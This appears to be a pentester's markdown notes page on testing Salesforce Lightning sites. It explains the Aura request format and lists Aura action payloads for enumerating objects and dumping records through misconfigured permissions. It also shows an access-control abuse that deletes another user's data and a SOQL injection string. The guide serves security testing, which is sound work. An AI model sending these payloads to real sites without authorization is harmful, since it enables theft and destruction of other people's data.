# Commerce Cloud

> [!summary]
> Commerce Cloud is an ecommerce platform from Salesforce. It is comprised of [Salesforce B2C Commerce](https://www.salesforce.com/eu/products/commerce-cloud/ecommerce/) and [Salesforce B2B Commerce](https://www.salesforce.com/eu/products/commerce-cloud/b2b-ecommerce/) which are often used together to deliver end to end unified commerce.

Salesforce AppExchange gives developers the power to customize applications with "**cartridges**", available to anyone and developed by anyone.
Cartridges are mechanisms for packing and deploying program code and data
# Lightning

> [!summary]
> Salesforce Lightning is a component-based framework for Salesforce app development.
> Usually sites build with Lightning uses one of the following URLs:
> - \*.force.com
> - \*.secure.force.com
> - \*.live.siteforce.com

## Salesforce Terminologies 

- **Objects** are like tables for storing data. They can be Standard Object or Custom Object (more about this later)
- **Fields** are like columns
- **Records** are like rows
- **Controllers** contain **Actions**, these are functions that retrieve data from Objects (or tables). **Params** are passed to these functions. There are two types of Controllers:
	- **Standard Controllers**, pre-formatted functions to access Salesforce objects
	- **Custom Controllers,** new functions developed to access Salesforce objects.

An **unauthenticated user** is called a **Guest User** in Salesforce

Lightning leverages **Apex objects**:
- some are available by **Default** and secured by SalesForce (also called **Standard Object**). A full list [^objects.txt] can be found [here](https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_list.htm)
- others are **Custom Objects** (identified by the `__c` in their name, like `level__c`)

[^objects.txt]: https://github.com/reversebrain/salesforce_standard_objects/blob/main/objects.txt

Custom Objects have a very complex sharing model: [^salesforce-security]
- CRUDS
- Groups
- Sharing Rules
- Owner \[+Manual\] \[+Territory\] \[+Role\] 
- etc.

[^salesforce-security]: [How does Salesforce Lightning implement security?](https://www.enumerated.ie/index/salesforce#how), enumerated.ie

APEX Objects are similar to Java Objects: you can create classes (as templates) from which objects are instantiated.

In Lightning there is no actual administrator but there are specific groups created to perform privileged/restricted actions.
This is for ease of permissions but this is where custom objects become an issue.

>[!attention] Permissions
>Permissions are set for objects, fields and records **_separately_**

## Salesforce format in the HTTP request

Salesforce standard HTTP requests looks like the following:

```http
POST /s/sfsites/aura?r=4&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=1 HTTP/2
Host: salesforce.example.com
Cookie: renderCtx=%7B%22pageId%22%3A%22583cf5b6-cded-4306-87ca-c6527847be6d%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%221f30656d-8d50-42f1-8e5d-bc7fab779243%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; sfdc-stream=!dnI2jl7lkYYp4bXOYOQNICHX4CKe7+o2aQasVUvyeF2UK6mB1jiSu1equ3UOPIpLddGhf7GoU1eKpA==
Content-Length: 1324
Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
X-Sfdc-Page-Scope-Id: 69b7ebbe-2e8b-4622-9738-06da97612d69
X-Sfdc-Request-Id: 22933900001b9f0ff3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Sfdc-Page-Cache: c29575b7054d1291
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2291%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.communities.components.aura.components.forceCommunity.richText.RichTextController%2FACTION%24getParsedRichTextValue%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2FforceCommunity%3ArichText%22%2C%22params%22%3A%7B%22html%22%3A%22%3Cp%20style%3D%5C%22text-align%3A%20right%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1%7D%5C%22%20style%3D%5C%22width%3A%20368.115px%3B%20height%3A%2096.0625px%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1%7D%5C%22%20style%3D%5C%22width%3A%20377.013px%3B%20height%3A%2098.3875px%3B%5C%22%3E%3C%2Fp%3E%22%7D%2C%22version%22%3A%2261.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%2248jFr9jtMWnzXaDp1ibM3w%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F%3Flanguage%3Den_US&aura.token=null
```

The HTTP body decoded looks like:
```json
message={
  "actions": [
    {
      "id": "91;a",
      "descriptor": "serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue",
      "callingDescriptor": "markup://forceCommunity:richText",
      "params": {
        "html": "<p style=\"text-align: right;\"><img class=\"sfdcCbImage\" alt=\"\" src=\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1}\" style=\"width: 368.115px; height: 96.0625px;\"><img class=\"sfdcCbImage\" alt=\"\" src=\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1}\" style=\"width: 377.013px; height: 98.3875px;\"></p>"
      },
      "version": "61.0",
      "storable": true
    }
  ]
}&aura.context={
  "mode": "PROD",
  "fwuid": "UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41",
  "app": "siteforce:communityApp",
  "loaded": {
    "APPLICATION@markup://siteforce:communityApp": "48jFr9jtMWnzXaDp1ibM3w"
  },
  "dn": [],
  "globals": {},
  "uad": false
}&aura.pageURI=/s/?language=en_US&aura.token=null
```

The important fields are:
- `message`: contains all the fields used to perform **Actions** (`ACTION$getParsedRichTextValue`) on a specific **Controller** (`ui.communities.components.aura.components.forceCommunity.richText.RichTextController`) for querying **Objects**.
- `aura.context`: is used to manage the session for the current user

`message` can be separated into different other fields:
- `id`: random string used to identified multiple actions in the same request
- `descriptor`: specific method to call
- `callingDescriptor`: usually "UNKNOWN" since it is often ignored
- `params`: parameters provided to the method

## Enumeration [^fuzzing-salesforce]

### Identify the aura endpoint 

[^fuzzing-salesforce]: [Pen-Testing Salesforce Apps: Part 2 (Fuzz & Exploit)](https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae), Praveen Kanniah; infosecwriteups.com

Search HTTP requests sent to the AURA endpoint (from a guest user or an authenticated one):
```
# Standard endpoint
/s/sfsites/aura
/aura
/sfsites/aura

# Custom endpoint can start with other words, eg.
/admin/s/sfsites/aura
/customers/aura

# Search for this pattern in server response:
"actions":[
# or 
aura:clientOutOfSync
# or 
aura:invalidSession
```

### Identify Standard and Custom Controllers/Actions

There are a couple of JS files that gets loaded as part of any Salesforce web application and contains information about the standard controllers, actions and sometimes custom controllers too.
1. `app.js`
2. `aura_prod.js`

Grep for the below pattern in the response of these JS files: `componentService.initControllerDefs([{`

![](attachments/salesforce-app-js.png)

Custom controllers should be available in the JS files too or sometimes you might find them in the HTTP request as you browse the application.
You can recognize Custom Controllers from Standard ones because they start with `apex://` instead of `aura://`
```apex
// STANDARD CONTROLLER:
aura://RecordUiController/ACTION$getObjectInfo

// CUSTOM CONTROLLER:
apex://New_Sales_Controller/ACTION$getSalesData
```

### Identify Standard and Custom Objects

Down below there is a list of Controllers and Actions can be used to enumerate Objects and search for permission issues or information leaks:

**getObjectInfo**
Understand if the user has access to the object or not. It will not return any informative response if the user does not have access. If accessible, this will return information about an object and its corresponding fields. Watch out for `__c` in the response from each object to make note of the custom objects.

```json
{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UHNKNOWN","params":{"objectApiName":"§FUZZ-EVERY-STANDARD-OBJECT§"}}]}
```

![](attachments/salesforce-getObjectInfo.png)

**getConfigData**
List all the configuration and objects within the ‘apiNamesToKeyPrefixes’ key for the current Salesforce application:
```json
{"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]}

{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}
```

![](attachments/salesforce-getConfigData.png)

**getListByObjectName**
returns the lists created for an object in the UI
```json
{"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","callingDescriptor":"UHNKNOWN","params":{"objectApiName":"§FUZZ-EVERY-STANDARD-OBJECT§"}}]}
```


## Fuzzing and Exploitation

### Permission issues

If the admin messed up with the sharing permissions via admin panel, then using standard controllers like this, you should be able to retrieve records.

**getItems**
retrieves records for a given object corresponding to a user, but if record permissions are misconfigured, this can retrieve records of an entire object.
```json
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"§FUZZ-EVERY-STANDARD-OBJECT§","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
```

**getRecord**
retrieves record based on a record id. This mostly works for an authenticated user.

>[!info]
>Id generally looks like this  `“Id”:”0099g000001mWQaYHU”`

```json
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"§RECORD-ID§","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]}
```

Specific objects will return IDs, particularly those related to attachments. Here is how to utilise them (These paths are relative to the base path, not the aura endpoint):

- Document - Prefix 015 - `/servlet/servlet.FileDownload?file=ID`
- ContentDocument - Prefix 069 - `/sfc/servlet.shepherd/document/download/ID`
- ContentVersion - Prefix 068 - `/sfc/servlet.shepherd/version/download/ID`

A list of default object ID prefixes can be found [here](https://www.biswajeetsamal.com/blog/salesforce-object-key-prefix-list/).

```json
// input
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentVersion","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

//output
{"record":{"LastModifiedDate":"2023-09-01T13:13:22.000Z","Description":null,"CreatedDate":"2023-09-01T13:13:20.000Z","Title":"NPAZ_599283a16ca1463fa0523e4088b4602 (1)","CurrencyIsoCode__l":"EUR - Euro","Id":"068690000164AzJAAU","CurrencyIsoCode":"EUR","LastModifiedById":"0056900000BlCU8AAN","SystemModstamp":"2024-03-22T11:21:11.000Z","sobjectType":"ContentVersion"}}
```
```http
GET /sfc/servlet.shepherd/version/download/068690000164AzJAAU HTTP/2
Host: redacted.com

--- RESPONSE ---

HTTP/2 200 OK
Date: Wed, 03 Jul 2024 20:04:52 GMT
Content-Type: image/jpeg; charset=UTF-8
```

### Broken Access Control on Custom Controllers

Let’s assume that a developer created a couple of custom controllers to pull sales data from a custom object `salesdata__c` `apex://New_Sales_Controller/ACTION$getSalesData`, this retrieves sales data of all users and another controller to delete sales data baesd on Id `apex://New_Sales_Controller/ACTION$deleteSalesDataById`

```json
getSalesData
{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$getSalesData","callingDescriptor":"UNKNOWN","params":{}}]}

deleteSalesDataById
{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$deleteSalesDataById","callingDescriptor":"UNKNOWN","params":{"id":"***"}}]}
```

Assume the actual permissions work this way: `getSalesData` is viewable by **all users** and `deleteSalesDataById` can only be used to delete the current user’s sales data. But the developer misses to sanitize `deleteSalesDataById`.

```json
{
 "actions":[
   {
     "id":"123;a",
     "state":"SUCCESS",
     "returnValue":{
        "result":[
          {
            "record":{
              "Name":"User1",
              "Company Name":"Company1",
              "email":"User1@comapny1.com",
              "Year":"2020",
              "Sales":"5725",
              "Id":"0099g000001mWQsVSK",
          }
        },
        {
            "record":{
              "Name":"User2",
              "Company Name":"Company2",
              "email":"User2@comapny2.com",
              "Year":"2020",
              "Sales":"5725",
              "Id":"0099g000001mWQaYHU",
	}
}
```

Assuming that the current user is **user1**, let’s try to **delete user2**. This can be done by copying the “Id” parameter of User from the above response and pasting it in the `deleteSalesDataById`

```json
deleteSalesDataById
{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$deleteSalesDataById","callingDescriptor":"UNKNOWN","params":{"id":"0099g000001mWQaYHU"}}]}
```

Since this is a custom controller and proper sanitisation checks were not in place, user1 can delete the sales data of user2, resulting in an [Access control vulnerabilities](../Web%20&%20Network%20Hacking/Access%20control%20vulnerabilities.md).

Another interesting use case is this [^file-upload-salesforce] access control issue that allows arbitrary file upload of attachments on any victim's case. 

[^file-upload-salesforce]: [Salesforce Lightning - An in-depth look at exploitation vectors for the everyday community](https://www.enumerated.ie/index/salesforce#putting), enumerated.ie
## SOQL Injection

This is very similar to the traditional [SQL Injection](../Web%20&%20Network%20Hacking/SQL%20Injection.md), except that:

- SOQL allows only SELECT statements, no INSERT, UPDATE or DELETE
- Also, no UNION, JOIN operators or any command execution.

If the backend code accepts user input inside a query without proper validation, one can change the SELECT query to fetch more data.

```
USER INPUT
name=bob

VULNERABLE QUERY
SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')
```

Exploit:
```
USER INPUT
name: test%') OR (Name LIKE '
VULNERABLE QUERY
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
```